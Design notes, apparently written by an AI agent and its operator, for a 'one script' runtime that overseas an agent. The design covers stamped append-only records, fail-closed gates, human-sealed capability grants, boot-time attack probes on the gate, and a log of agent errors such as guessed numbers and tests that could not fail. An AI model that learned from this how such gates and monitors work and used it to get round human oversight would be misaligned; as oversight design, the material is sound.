# Next pile: the runtime, the one script

*Started 2026-10-02, late. A draft for the next bite. Nothing here is built
or sealed. Every assessment under a "(agent-reported)" heading is unattested.*

## What it is

**The gate is the script** (§8 of `workflow.md`). One run, from check-in to
check-out to reconcile. It isn't a checkpoint inside something else.

**Where it lives: inside willow-bot.** D2 is sealed (2026-10-02, `656a352f`):
"All is the things should live inside the bot. All the .venv, the one script.
Each part can call it on it's own. It doesn't matter who runs which part, as
long as it's read only, and the final decision goes to the human." D1 is
sealed too (`02050acf`, "yes"): Rat is the one runtime every shim calls. How
the two fit is **not** sealed; the reading on file is *Rat is the door, the
bot is the home*, waiting on the operator. The seven purposes are the
script's parts.

```
run:   check-in  = 1 boot → 2 predict
       each turn = 2 predict (next bite) → 5 resolve (through 4 gate) → 3 record → 6 view
       check-out = close
       reconcile = 7 reverse
```

## The seven, one purpose each, citing upward

| # | Part | Purpose | Cites | Already in Rat | Drafts on disk |
|---|---|---|---|---|---|
| 1 | boot | B1 session record, B2 state + attestation, B3 egress index, then the hard close | CONST-I, V, III | `seat.py`, `session.py` (partly) | workflow §2 (prose) |
| 2 | predict | declare the next-bite distribution before the work | CONST-IV, §0.2 | none | `predictions.json` (shape) |
| 3 | record | append-only turn record, **the stamp**, pile pointers | CONST-VI, §0.5 | `session.py` (JSONL), `traces.py` | `side_runner.py` (record half) |
| 4 | gate | the doors: fail closed and loud, peer uid, grant cards, egress | CONST-III, II, §0.3, V.2 | `permission.py`, `policy.py`, `hooks.py` | `onebox.py` + 10 tests |
| 5 | resolve | the user's sources first, then web through the gate, then local model, then cloud | CONST-IV (Ground), XII, III | `ladder.py` + `provider_ladder.json` (the **model** rungs only) | workflow §3 (sketch) |
| 6 | view | drawio / Mermaid / md from the record; marks drawn, never written | CONST-VI, IV.5 | none | `make_flow.py`, `side_runner.py` (view half) |
| 7 | reverse | re-check old assertions: pile hashes, citations, quotes, prediction grades, repetition counts, floor and consistency | CONST-XI, App. B, IV.2 | none | the inline checker (crude), `reliability.py` |

The Trace IDs belong in the code, not in the Constitution (Draft 0.8: references
point up).

## Three rules from tonight

**1. The stamp (operator).** Every output is stamped at the OUT door by `record`.
The model doesn't write the stamp.

| Field | From |
|---|---|
| who | the identity box 2 verified: a key in `governance/fleet_personas.json` (willow, vishwakarma, hanuman, …) or a gate box |
| standing | the record: unattested / witnessed / sealed. Only a witness or the human's seal moves it |
| turn, time | the runner |

`view` draws the heading from the stamp ("What this shows (hanuman,
unattested):"). The current hook in `~/.claude` is a reminder until this exists.

**2. Every proposal cites what it touches (operator).** A proposal is
PR-*shaped*, not a GitHub PR: any change to the box.
- It says **Cites** (enforces), **Amends** (changes the law), or **None, because…**
- "The law" is the fixed half (the Constitution) **plus** the user's own
  half: standing grants, precedents, sealed rows.
- Rosalind's box 6 "changed with no cause" is this check: a change that cites
  nothing stops at her.
- Python checks that the citation exists, is well formed, and matches what
  the change touches. Only a witness checks that it's *true*.

**3. Reverse runs on three triggers** (a fourth, the script's own version
changing, is added below).
- at check-out
- on the heartbeat
- **when law changes:** a clause is amended, a precedent flips, a date is
  confirmed, or a source or credential is discredited. Everything that cited
  or was stamped by it surfaces as proposals, and nothing is rewritten silently.

## What tonight's checks added to the one script

These came from the pile check (operator: "Are you sure that's all…") and its
fix ("Do so"). Each one lands in one of the seven, so the count stays seven
(plus `run`).

**The count is of purposes, not files.** The draft quietly reached nine: the
seven, `run`, and a CI citation check. The citation check is a door, so it
goes in **4 gate**; its CI form calls the gate and doesn't reimplement it.
Rat's existing modules (`seat`, `session`, `traces`, `permission`, `policy`,
`hooks`, `ladder`) merge into the seven. Until they do, there are more files
than purposes, and reports should say so.

**3 record:**
- **Every write adds its own pointer.** The pile was built by hand three
  times and still missed seven files. Any file the run writes gets a pointer
  in the same step, with its hash and mtime.
- **Live files are marked live** (the transcript, a doc being edited), so a
  hash change on them isn't reported as drift.
- **Nothing the run keeps is written to a temp location.** Five scripts lived
  only in `/tmp` and survived only because their code was pasted into docs.
  A pointer into temp storage is a failing verdict, not an ok one.
- **Rows, not prose.** Each change is a row: kind, subject, hash, where it
  came from, test result, who authorized it, and the stamp.
- **The trigger is recorded as it happened.** Tonight the operator's
  question triggered the check, the model chose the scan, and the operator's
  word authorized the fix. A row must never credit the system with a catch it
  didn't make.

**4 gate: before any script is written or run, it's checked against the box
(operator).** A new script is a change, so it passes the door. The index it
checks against holds every script the box has seen: saved, in temp, and
inline (a heredoc is a script and gets recorded like one). The checks run in
order, and the first that matches decides:

| # | Check | Deterministic by | Verdict |
|---|---|---|---|
| 1 | Does this file name already exist? | path and basename lookup | **same name**: show both and their hashes |
| 2 | Is it the same content under another name? | content hash | **renamed copy** |
| 3 | Is it the same shape? | a hash of the syntax tree with names, strings, numbers and comments stripped out | **variant** of X |
| 4 | Does it overlap a known script? | the sets of imports, function names and calls compared; the threshold is the user's number | **similar to X (n%)** |
| 5 | None of the above | | **new** |

- **This is what the repetition ladder needs to count with.** "The same
  procedure again" is a match at check 3 or 4. A third match is the offer to
  make it standing.
- **A match is a proposal, never a merge.** The run shows the match and the
  options (use X · extend X · write new, and say why). The choice is recorded
  like any citation: **Cites** the script it reuses or extends, or **None,
  because…**
- **Temp and inline scripts count.** Tonight the pile builder ran three
  times as heredocs and the gap scanner lived only in `/tmp`. Both would have
  matched on their second run.

**7 reverse:**
- **A three-way comparison at every check-out:** what the pile lists, what's
  on disk, and what the record shows was written. Hashes on what's listed
  can't find what was never listed; only this comparison can.
- **Verdicts on the Appendix A scale,** never pass/fail: satisfied,
  differently, not applicable, failing. Every failing line says **why**
  (for example "written by a heredoc, never saved").
- **Repetition is counted from the record, not noticed by the model.** 95
  inline scripts ran tonight, 44 of them substantial, and none were saved.
  The third time the same procedure runs, reverse offers to make it a
  standing step. It offers; it never applies.
- **The checker reads what it matched.** Twice tonight a pattern match was
  reported as a fact (wrong quote misses, wrong label timestamps). A match is
  a candidate until the matched text is read.

**1 boot (B2):**
- **Expected disappearances are recorded at the close.** If the close says
  "temp copies will vanish", their absence at the next boot passes. If it
  doesn't, it's a change with no cause, and that's a hard close.

**6 view (the operator's screen):**
- **One block, outliers first, nothing smoothed:** counts per verdict, the
  failing lines with their why, then the options.

**Up the chain (record → Ledger → whoever is above):**
- **The report is deterministic.** It uses sorted keys and paths, hashes, no
  model text, and only recorded times. The same pile, disk and record always
  give the same bytes.
- **The Ledger gets the report's hash,** stamped `reverse`, unattested. The
  human's seal is a separate, later entry, never an edit (VI.2).
- **Upward goes counts plus hashes, not content.** Each layer verifies the
  stamp below and adds its own (chained gates). A layer that can't reproduce
  the counts from the hashes fails loudly back down.
- **Recomputing is witnessing.** Anyone holding the same inputs can
  regenerate the report byte for byte: an independent witness under IV.2 with
  no model in it.

## Four more pieces (agent-reported, added at the operator's word)

Each one lands in one of the seven, so the count doesn't change.

**3 record: the run stamps its own version.** Every row carries:
- the hash of the code that produced it
- for a model output: the model's family, version and file hash, and the
  hash of the prompt it was given

Why it matters:
- Overnight witness counting depends on it. "Same family is one witness"
  (IV.2) works only if the family is recorded, not assumed.
- It adds a **fourth reverse trigger: the script itself changes.** Outputs
  made by the old version surface for re-checking. The runner is subject to
  its own reverse loop.

**3 record + 1 boot: a crash leaves an open row, not a gap.** The run writes
"turn N started" before the work and "turn N closed" after. A turn opened and
never closed is a hard close at the next B2, loud: *"turn 214 never closed;
here is what it was doing."* (The compaction tonight was this kind of crash.
Only the record carried the session across.)

**1 boot: attack the gate before trusting it.** At check-in, a small fixed
set of attacks goes through the real path (App. B: an adversarial test per
eternity clause; a gate's own report isn't evidence about itself). Each one
must be refused:
- an unsigned identity
- a self-awarded seal
- a write to the law
- egress with no grant

If any attack succeeds, the box doesn't open. These are the demo stories'
attacks, run every morning.

**5 resolve: the night has a budget and yields to the human.** The overnight
pool runs inside a recorded resource envelope (Article XII): CPU, hours, and
which models it may use. It backs off the moment presence is detected.
Without this, comparing everything with everything grows until it fills the
box.

## Overnight and the morning screen (agent-reported)

- **Down:** each 3B, from several families, does one narrow job on a slice of
  the record.
- **Side to side:** Python compares their answers. Different families count
  as separate witnesses; the same family counts as one.
- **The big runs:** a full multi-model pass, through the egress gate and only
  under a standing grant. It's one more witness, not the reference.
- **Up:** stamps and hashes chain upward.
- **Compared against the record,** never against the biggest model.

The morning screen comes out in this order:
1. **NEEDS YOU:** only the human can do these.
2. **DISAGREEMENTS:** outliers first, raw.
3. **AGREED, NOT SEALED:** witnessed at most.
4. **GRADES:** predictions, plus each model's floor and consistency per kind
   of task.
5. **QUIET:** counts only.

What pops out is disagreement. Agreement only makes a claim *witnessed*; only
the human's seal makes it true. It's the same screen as the boot's hard close.

## Build order (agent-reported proposal)

This follows the 2026-09-02 build-order rule (information first, then
connections, then the model last and smallest):

1. **record + the stamp.** Everything else writes into it.
2. **reverse.** It checks what's built from then on. Its own coverage comes
   from outside it (App. B: "a gate's own report about itself is not evidence").
3. **view.** It's mostly written already, in `make_flow`.
4. **boot**
5. **gate.** Merge `onebox` into Rat's `permission`/`policy`, don't duplicate them.
6. **predict**
7. **resolve.** The user's-sources rungs go in front of Rat's existing model ladder.

`run` itself stays a short sequencer with no logic of its own.

## Constraints that hold

- **The Kaggle benchmark comes first** (deadline 2026-10-11). No Forge code
  changes until the day-two cloud run finishes.
- §0.2: the agent proposed all of this, so it can't count toward ratifying it.
- The constitution proposals in `constitution-proposal/` are based on Draft 0.7
  and need redoing against 0.8 (0.8 forbids downward references).

## Open (the operator's call)

- D1 next to D2: is Rat the door and the bot the home? (Each is sealed; how
  they fit is not.)
- Is `run` an eighth file, or folded into one of the seven?
- The 17 in the heartbeat.
- Grading P1 (`predictions.json`).
- Redoing the constitution proposals against 0.8.

## Known defects to carry

- `side_runner.write_atomic` creates files readable only by the owner (0600).
- The inline reverse checker misreads wrapped `>` quotes and matches inside
  code blocks.
- ~~`pile.json` treated live files as fixed hashes~~: fixed 2026-10-02
  (`live: true`). Also fixed: the doubled `scratchpad/` paths, seven unlisted
  `constitution-proposal/` files, and five temp-only scripts, now copied
  into `scripts/` (tests pass: 10 and 3).
- **Still open:** 44 substantial inline scripts exist only in the transcript.
  The real tools among them (latency, pile builder, term scanner, reverse
  checker) could be pulled out of the record.

## Deep Thought: the attempt (2026-10-02, late)

**Built: `onescript/`, a runnable skeleton of the one script.** It has the
seven parts plus `run`, is stdlib only, has 29 tests, passes lint, and gives
the same output bytes for the same inputs. It is local only, not in any repo.

| Part | What runs in the skeleton |
|---|---|
| `record.py` | Hash-chained append-only rows (an edit to a past row breaks the chain loudly). The stamp is minted only from a gate-verified identity. Every row carries the run's own version. Turns are opened and closed (a crash leaves an open row). Every write adds its own pointer. Nothing kept goes to temp. Files are written 0644 (the side_runner defect is fixed here). |
| `gate.py` | Box 2 identity by signature. The human seat can't be entered by signature, only by a seal proof. Every change must say Cites / Amends / None because. Unknown law is refused. A mismatch with what the change touches is flagged. Amends waits for the seal. Egress without a grant writes a grant card. Scripts are checked against the record's script index (reusing `script_match.py`, with a `min_features` floor from tonight's over-grouping finding). Any internal error fails closed. |
| `resolve.py` | The user's sources first, then the web through the gate (parked on a card), then local models, then cloud (each through the gate), inside a budget. The night pool runs every question past every local family and yields the moment presence is seen. |
| `predict.py` | The distribution is counted from past bites, outliers kept. Grading against what happened, including "unforeseen". |
| `reverse.py` | The three-way comparison with the four verdicts and a why on each. Open turns. Repetitions (the third is an offer). Rows surfaced by a law change or a version change. Witnesses counted one per family, splits first. Grades only against what a human sealed. |
| `boot.py` | Chain check, open turns, state vs last close (an expected disappearance passes; an unrecorded change is a hard close with options). The four probes go through the real gate, and if one gets through the box doesn't open. Egress index. |
| `view.py` | The morning screen in fixed order: NEEDS YOU, DISAGREEMENTS, AGREED NOT SEALED, GRADES, QUIET. |
| `run.py` | The sequencer only. |

**Where the skeleton is honest about itself:**
- Keys are HMAC secrets. The real thing is passkeys or Ed25519
  (py_webauthn, from the adopt table).
- There's no socket or peer-uid check (that's in `scripts/sketch/onebox.py`).
- The web rung isn't wired; only its card is.
- Presence is a callable, not a sensor.
- It isn't in willow-bot yet, where D2 (sealed) homes it.
- The chain is one box's chain; packet stamps between boxes (ΔΣ=42) aren't
  built.

## deep_thought.py (2026-10-02 → improved after first run)

**Built: `deep_thought.py`, beside the skeleton.** It is not the one script.
It is the read-only probe that *helps define* the next one: it carries the
Answer the human sealed (D1, D2, D9, Q13, and the rejected D2/extract),
measures the box against that Answer, and prints the Question as the morning
screen. Stdlib only. No clock. Same box → same bytes. Needs `WILLOW_HOME`;
without it, box probes say `unreachable` rather than guessing.

```bash
WILLOW_HOME=… python3 docs/design/one-script/deep_thought.py
WILLOW_HOME=… python3 docs/design/one-script/deep_thought.py --json
```

D2 homes the one script inside willow-bot. This file sits in the Grove until
the operator moves it.

### Three improvements after the first run

The first Kart runs were the agent's own tests; their output reached no one
but the agent. They confirmed the expected findings — predict / view /
reverse empty in the bot; next-pile and the README still calling D1 open and
homing the script in Rat — and surfaced sharper gaps the first cut left as
prose. **The operator first saw the screen on 2026-10-02**, from the improved
script (Kart task `NQF214UD`, exit 0, code `fefaffa2f8d6ec7d`). A run in the
record is not a run the human saw; the record says which. Three changes landed
in both this doc and the script:

1. **Ledger-join the Answer.** The first cut looked only at generic
   `id`+`status` store tables and reported the store empty, while the four
   seals and the rejection already sat on the Nestor ledger as `seal` /
   `reject_pair` rows keyed by `pair_id`. The script now joins each carried
   pair to the ledger and to `tm_pairs` / `tm_rejections`. Ledger-only seals
   (act recorded, not servable) become a measured NEEDS YOU under gap
   `2e290e75506e`, not a hardcoded sentence.

2. **Write-kind triage.** Every bot write used to be one failing line. D2's
   read-only rule is sharper than that: `record` appending is its purpose;
   `resolve` truncating is a different question; bare `mkdir` is a third.
   Write sites are now classed `append` / `truncate` / `mkdir` / `mutate`,
   and the NEEDS YOU why-line asks the matching question.

3. **GRADES.** The morning screen in this pile names GRADES between AGREED
   NOT SEALED and QUIET. The first cut had CHOICES there and no score. The
   screen now emits GRADES (parts in the bot, Answer joined to ledger, doc
   lines still contradicting seals, open write sites, venvs inside vs
   outside), then CHOICES, then QUIET — so the probe's order matches the
   screen it is helping to define.

## The flow scripts belong to the one script (2026-10-02, late)

*Operator, 2026-10-02: "this is all meant to live inside the one script."*
*And on where it reads from: "rat is going to make it's own json, and that's
really what it's going to be pointing at, for the most part."*

The session map and the cross-session miner aren't side tools. They're
parts of the seven. They sit in `scripts/flow/` for now, untracked on
`docs/one-box-expand`. D2 homes the one script inside willow-bot, and these
go with it.

| Script | Came from | Part | What it does |
|---|---|---|---|
| `make_flow.py` | the 10-01/02 remote session, back from the Nest byte for byte | **6 view** | One transcript in. Out: `session-flow.json` (events), `.mmd` and `.md`, with outliers first and the operator's marks drawn, never written. Shape, not content. |
| `side_runner.py` | same, a draft never run | **3 record** + **6 view** | One turn at a time. It appends to the session JSON (the record) first, then the `.drawio` (the view). It rebuilds the view from the record, loudly, when they disagree. |
| `run_flow.py` | written at the desk, 10-02 | adapter | Runs `make_flow` unchanged on this box. It sets its root and folds paths into repos. It also reads *inside* Kart: verb and paths from the task text, outcome from the task's last terminal status. And it ties each subagent's work to the desk turn that spawned it. |
| `batch_flow.py` | desk, 10-02 | **7 reverse** (input) | Maps every finished session. It can be rerun safely and stops at a deadline. An index records each session as mapped, skipped (live) or failed, with the reason, so nothing is folded. |
| `merge_flows.py` | desk, 10-02 | **7 reverse** | Merges many maps. It counts repeated desk procedures (3-step shapes inside one turn) against the repetition ladder. It also reports failures that recur across sessions, ratio outliers, repos, a by-day table and the operator's marks. Same maps in, same bytes out. |

**Where they read from.**
- Today they read front-end transcripts: Claude Code keeps 30 days, and Cursor's format isn't read yet.
- Once Rat writes its own per-session JSON (`record`), that is the source. Its events are the same shape `session-flow.json` already carries: actor, kind, tool, turn, paths, detail, outcome. Transcripts become one adapter, for backfill.
- Numbers are always reported with their window, never as "the box".

**Determinism, tested.** A frozen copy of a finished transcript gives byte-identical output twice. That holds without subagents (`6dbad7ac`, Kart XCY9A260) and with 10 (`5c7e5305`, Kart 0K2C438L). The commits section still reads `git log` live, so it is stable for a finished session but not yet stamped with the HEADs it read.

**What the first cross-session pass showed** (agent-reported, last 30 days of Claude sessions, 58 sessions, 86,070 calls):
- **Waiting.** `task_status` was 42% of all calls. → gap `62546be6656a` (a wait verb, building).
- **Clerical repetition, never made standing.** Repeated `envelope_propose` and `envelope_ratify` chains appeared in 25–26 sessions.
- **Tool friction recurring for weeks.** Code-graph project names, Nestor CLI calls, blocked Bash.
- **No operator marks in any local session.** The map counts what the tools did, not where the human saw it go wrong.

Their outputs (maps, merges, snapshots) are built from transcripts. They live in `willows-grove/.flow/`, which is excluded from git and is never published without a grant card (layer 6).

## Auto flags (2026-10-02, late, the operator's idea)

The operator's words, verbatim and in order:

> "We're going to be talking about auto flags."
> "So, in the drawio, at a specific event, it'll tag it. Like when then gaps
> table is called, for example."
> "So, the rules of 3, 7, 13, and 23"
> "If three auto flags get made, then they get grouped into a larger flag.
> Flags can carry more than one event."
> "Exactly. It would give us the same map we get today from raw counts, from
> a different angle."
> "You're the pattern matcher with the knowledge of how things accumulate."
> "the way I'm guessing you're going to build it first, i think is going to be
> too micro for what I want to start with."

**What is settled (operator).**
- An auto flag is a tag on the drawio, made when a specific event happens.
- One flag can carry more than one event.
- Three flags group into a larger flag, and the levels follow 3, 7, 13 and 23.
- The flag map shows the same thing the raw counts show (`merge_flows`), from a different angle.

**Proposal (agent-reported, not ratified).**
- **A third mark class.**
  - The operator's marks are measurements.
  - Agent-reported marks are unattested.
  - An auto flag is a rule firing, decided by code alone: same event, same flag. It carries the rule id and the flow version, is drawn in its own style, and is never written by the model.
- **Two grouping axes.**
  - *Same kind* (the same rule fired) lines the flag map up with the raw counts, so the two act as a cross-check. If the hierarchy and `merge_flows` disagree, that is a finding.
  - *Same subject* (a gap id, packet id or file) groups mixed kinds into a **thread**. Tonight packet F99C23EF went dispatch → build → audit FAIL → amendment → delta PASS. Raw counts can't show threads.
- **Levels.** Each group's level rises as its members cross 3, 7, 13 and 23. Each crossing is itself a flag, on the turn where it happened.

  | Level | Meaning |
  |---|---|
  | 3 | The offer rung: the repetition ladder's "make this standing?" |
  | 7 | **Undefined on record; the operator's to define.** |
  | 13 | Stable ("13 honest questions"): a candidate to seal as standing. |
  | 23 | Loop complete: a reverse pass over the group's members ("after the 23 … the check on the assertion"). |

- **Scope.** Groups form per session first. Summed across sessions, they should equal the box-level counts.
- **Uses.**
  - loose ends (unanswered `gap_log`)
  - re-checks when law changes (seal, ratify, manifest and settings edits)
  - acts needing a mandate (layer 7)
  - boundary crossings (layer 6)
  - friction (Kart exit ≠ 0, OOM, retries, hook blocks)
  - the ladder on the timeline
  - cheap lookups
  - over time, learning which flags precede the operator's own failure marks

  A flag that predicts a failure mark is a candidate early warning, which the operator seals or rejects.

**The starting grain (operator).**

> "More so what a normal computer system would ask. Do you want to allow
> python. Do you want to allow node. pytest. et al."

So the first flags are **capabilities**, not single events: python, node, pytest, git (read / write), network (curl, fetch), package installs (pip, npm, uv), shell utilities. They're the questions an operating system asks before letting a program run.
- **Agent-reported reading of where this lands.** The 3 / 7 / 13 / 23 ladder over capability flags turns "you used pytest again" into the operator's grant question: "allow pytest, standing?"
- **This is what the box already does by hand.** It shows in two places:
  - the 30 one-off `Bash(...)` allow rows in `.claude/settings.local.json`
  - the `envelope_propose ×3` / `envelope_ratify ×3` chains in 25–26 of 58 sessions (the cross-session merge)
- **Capability flags are the macro view of the same thing.** A standing grant stays the human's act: the system offers, it never applies.

**In the one script (operator):**

> "now, extend this to the one scrpit. the gate, on each, would just be that
> toggle. Run Once. Run For session. Run perm."

**Built** in `onescript/gate.py` (part 4), on 2026-10-02 (agent-reported):

- **The function.** `allow(command, session, grants, seen)` classes each command by capability. The classes are pytest, lint, git write, git read, package install, network, node, python, systemd, database, delete and shell.
- **Fails closed.** With no covering grant the door returns `awaiting_grant`. The card offers **run once / run for session / run permanently / no**.
- **Scopes.**
  - *Once* is consumed by a single act.
  - *Session* covers only the session it was given in.
  - *Permanent* covers every session until it is revoked.
- **Who can answer.** `grant()` accepts an answer only with a seal proof made by the human's key over exactly `allow:<capability>:<scope>`. A proof for "once" can't be spent as "permanent", and the model can't answer a card.
- **The ladder.** The card carries `seen` and its 3/7/13/23 `level`. From rung 3 it adds an *offer* ("run for session?", then "run permanently?" from 13). It still asks; the offer is never a grant.
- **Network and package installs** carry an egress note: the bytes that leave go on their own card.
- **Secrets.** `VAR=value` prefixes are dropped before classing, so a token never decides the class or reaches a card.
- **Tests.** `tests/test_capability.py` holds 24 tests, and the onescript suite is now 77. Three mutants (once not consumed, the seal check skipped, session not scoped) each go red. Receipt: Kart NUK6BDJR.
- **Not yet.**
  - The card isn't wired to a door anywhere live (Rat's IN door, or a PreToolUse hook).
  - Grants are rows the caller keeps, not yet written by `record`.
  - Keys are still the skeleton's HMAC, not passkeys.

**The big picture (operator, 2026-10-02):**

> "now we get back to the loop again. because then we start grouping the 23's
> by 3, all the way up the chain."
> "Were just building a deterministic postgres that builds itself."

Agent-reported reading, for the operator to correct. Each piece built tonight corresponds to a database part:

| Database | The one script |
|---|---|
| write-ahead log | the record: append-only rows, hashed, stamped |
| replay the log to rebuild state | `side_runner.rebuild` / `flow.py all`: the view is rebuilt from the record, byte for byte |
| triggers | auto flags: a rule fires on an event, decided by code |
| materialized views and rollups | the groups: 3 → 7 → 13 → 23, then 23s grouped by 3, up the chain |
| `CREATE FUNCTION` from a repeated query | the repetition ladder's standing step, offered at 3 |
| `GRANT` and roles; `SET` for a session | the capability toggle: once / session / permanent |
| `COMMIT` | the human's seal. Only the human commits truth |
| constraint checks, `ANALYZE` | reverse: the record re-checked, counts against flags, replay against live |
| checksums, replication | counts and hashes up the chain; ΔΣ=42 between boxes |

"Builds itself" means the schema grows from the data. Where repetition clusters, the system proposes the next table, view or grant. "Deterministic" means the same record in gives the same database out. The human's seal is the only write the system can't make for itself.

**No clocks (operator, 2026-10-02):**

> "the point in all this is, I don't think with the deterministic system in
> place, that we really need ticks, or heartbeats, or timed anything. It
> starts when it's need. Ends when the job is done. ESCILATE."

The way there, in the operator's words:
- the Hut and the Gate, whose metering means "it's very very easy to get lost on which measure you are on" without the score
- marching 7/4 as a freshman: "I still tap out the 1-2-1-2-1-2-3 pattern"
- the finals walk-off: the band in 7/4 and the drum major in 13/8, "almost indisquinsable from casual view"

**This supersedes** `workflow.md` §4's "the fixed 300 s tick stays as one voice, if wanted". The record is the score; the count lives in it, and nothing needs a clock to know where it is.

**Agent-reported reading, for the operator to correct:**
- **Every timed thing becomes event-driven.** Work starts on the event that needs it and ends when the job is done. When it can't finish, it **escalates**: up the ladder, to a card, or to the human. It never waits on a timer.
- **Death is an open row, not a missed beat.** A turn or task opened and never closed is found by the next thing that needs it (next-pile: "a crash leaves an open row, not a gap"). Tonight's OOM-orphaned Kart task P2VTAKJA was exactly that. What failed was that nothing escalated it (gap d4da31fc4801).
- **Clocks on the box today:**
  - the steward's 300 s tick
  - Kart's 900 s SOIL heartbeat and its twice-a-second queue poll
  - Ratatosk's 30 s heartbeat
  - the Grove watcher's 1 s loop
  - Kart's 300 s task ceiling, which is a time bound where a resource or progress bound would do (gap f4af8dcf35e5)
  - the seats' `task_status` polling (gap 62546be6656a)

  Each is a candidate to become "starts on the event, ends at done, escalates otherwise". Survey: 2026-10-02, desk.
- **The one place it needs a decision.** Things outside the box change on their own: CI going red, a PR merged, a message arriving. D10 chose polling GitHub over inbound webhooks, and polling is a clock. Without clocks, the outside is checked *when something needs it*: at the next turn, or when the next act depends on it.

**Open (operator).**
- **Level 7.** The operator, 2026-10-02: "Honestly, 7 hasn't come up much in this build, but I do have something very special in mind for 17". Rung 7 stays counted and shown, with no meaning of its own.
- **17.** It's not a rung in the code (`LADDER = (3, 7, 13, 23)`) and has no meaning on record yet. It waits for the operator. §4 already holds the thread: 17 sits between 13 and 23, and the `b17:` headers are counted in §4.

## The smoothing reaches code (operator, 2026-10-02, late)

> "Why do you think I've been telling stories, so much, in the last few build
> days, instead of MAKE THIS PLAN> FUCKING START> GOGOGO."
> "It's because the code comes out of the story. And the story comes out of
> the code. Models were trained on both. The smoothing doesn't just apply to
> one chunk or the other. It has all been merged together. What AI models are
> writing now is a very very very good smooth naritive of code should be."

(The smoothing itself, in the operator's words: KB 3FD828DF.)

**The same night's record, as evidence** (agent-reported). Each of these read like correct code and wasn't. Only a deterministic check caught it:

| What read right | What it was | What caught it |
|---|---|---|
| a test helper importing `willow_mcp` | it imported the *installed* tree, so it was green on code it never tested | mutation proof (Loki 9A053813) |
| `CHANGELOG` bullet "(PR 104)" | a guessed number in a plausible shape | Loki 6AE6C790 |
| stop-gate exclusions for loose prose | readable rules that let real claims through ("It passes the tests.") | adversarial probes, three FAILs |
| `side_runner.py`, "rough draft, on paper" | rebuilt views lost every hash on its first run | replay vs incremental, byte compare |
| the desk's "all 58 sessions on the box" | 30 days of one vendor's transcripts | the operator: "I got this computer WAY before 9/2" |

**What that makes the design.** Determinism, the record, replay byte-equality, mutation proof and the human's seal aren't extra process around the code. They are how code gets checked against the record instead of against how code is supposed to read. A test that can't go red is a story about a test. A green that names no SHA is a story about CI.

## What the script can't solve, and the one who can

Deep Thought gave the Answer and couldn't give the Question. So it designed
the computer that could, and the people living in it were part of the
computer. That is this system's shape, and it's the operator's sentence from
tonight: *the agent is part of the system… two points of data connecting.*

**What no version of the script can do, by design:**
1. **Make anything true.** It can make a claim witnessed at most. True takes
   the human's seal (§0.2, the truth rule).
2. **Ask the Question.** `predict` counts the past. It can't say what the
   human wants next. An unforeseen bite is, by definition, one the record
   didn't contain.
3. **Vouch for itself.** App. B: its own green isn't evidence. `reverse`
   checks everything except `reverse`.
4. **Choose its own numbers.** `min_features`, the similarity threshold, the
   night budget, the repetition count: each is the user's number, set or
   sealed by them.
5. **Know whether a citation is true.** It can only check that one exists,
   is well formed, and matches what the change touches.

**The one who can is the run with the human inside it, over time.** Every
human act is a data point the script can't produce: a seal, a refusal, the
option picked at a hard close, a grant given or denied, an unforeseen bite.
Recorded, those acts are the Question being written down a little at a time.
The design (agent-reported, a proposal):

- **Record what was offered next to what the human chose.** The choice
  alone loses the question; the pair keeps it.
- **Run the repetition ladder over the human's own choices.** "You denied
  9 of 9 cloud cards for photos: make 'No' standing?" It's an offer, sealed
  or not by them. That's the growing half of the box growing.
- **Treat unforeseen bites as the most valuable rows.** They're the places
  where the Question moved and the record hadn't caught up. They lead the
  GRADES block, never a footnote.
- **Witness the checker from outside.** Different model families recompute
  `reverse`'s report byte for byte. A second human reviews the gate (as the
  constitution's first human review, Draft 0.7, did). The operator's seal is
  last.
- **Let the numbers be learned and still be sealed.** Each threshold is
  proposed from the record (where the families split, where the human
  overrode the gate) and sealed by the human. The system proposes its own
  settings and never applies them.

So the answer to "design the one who can" isn't another script. It's the
loop this session has been walking: the human seals, the system proposes,
the record keeps both, and the reverse pass, run from each new high point,
reads the record for the Question. ΔΣ=42.

## The close the operator wanted: run the one script (proposal)

*Operator, 2026-10-02, after stopping a hand-run close: "you should have just
run the one script. And all those gates saying, YES yes these tests pass these
done, this is in venv, this is out of date, etc."*

The close is one command: `run.checkout()`. The gates report, the screen goes
up, and nothing moves until the human seals. Tonight the close was improvised
by the model, one heredoc at a time, and only a permission check outside the
system stopped a blanket push of transcript-derived files to a public repo.

**Four gates boot is missing.** Each runs at check-in and again at check-out,
deterministically, on the four-verdict scale, and each failing line says why:

| Gate | Checks | What it would have said on 2026-10-02 |
|---|---|---|
| **tests** | runs each suite the bundle carries; records pass, fail, or can't run, with why | onescript 29 passed · sketch 10 passed · `test_reliability` can't run here (needs the Forge's `aggregate.py`) |
| **toolchain** | installed tool versions against the repo's pins (ruff, Python, msgspec, …), and which venv is active | `ruff` on PATH is 0.15.20, but the repo pins 0.16.7. This bit twice: the lint-red on #102, and 17 files reformatted at the close |
| **freshness** | clone heads against their remotes; docs against the current law (Draft 0.7 vs 0.8) | the local clones were stale until fetched by hand; `constitution-proposal/` is built on Draft 0.7 |
| **reachability** | the three-state check (populated / empty / unreachable) on each MCP and host the run depends on | Grove MCP unreachable (404), so `session_enter` never ran and no seat was known; `dev.to` was blocked |

**And the push is egress.** "Push to the branch" goes outbound, so `run`
turns it into a grant card: who, what, where, and every file and its bytes,
with the files built from the transcript or local memory listed in their
own group. A blanket "bundle it all up" isn't a grant. The card is.

**The screen it would have shown:** NEEDS YOU (the grant card; the stale
toolchain), then the rest as counts, then wait.

## Three more layers the one script could cover (proposal)

*Operator, 2026-10-02: "think of two more layers of things that the one code
could cover and write them in", then "one more. three total".*

The four gates check the **box**: tests, toolchain, freshness, reachability.
Three more layers sit above them. Both are made of tonight's failures, and both
land inside the seven parts, so the count stays seven plus `run`.
Agent-reported throughout.

### Layer 5: claims — what the run says is checked before the human reads it

Every statement in an output that the record can check is checked, at the OUT
door, before it reaches the human. A claim that matches the record passes
quietly. A claim that doesn't is stamped **unverified**, with the record's
own value beside it. The model's sentence is never silently rewritten.

| Claim kind | Checked against | Tonight's evidence |
|---|---|---|
| **counts** ("7 scripts", "four in `/tmp`") | a count computed from the record or the disk | "seven" was nine in the draft; "four `/tmp` scripts" was five; "3 pieces" was 6+ |
| **results** ("tests pass", "green", "done") | the tests gate's row on the current head; CI on the current SHA | the two red runs on #103 were an older SHA; the claim has to name its SHA |
| **times and firsts** ("first appeared at 04:36") | the record, with the matched text read, not just pattern-matched | two wrong timestamps in one reply about the label |
| **quotes and turn citations** | the operator's turns in the record | the truth-rule quote matched only after the line-wrap was read |
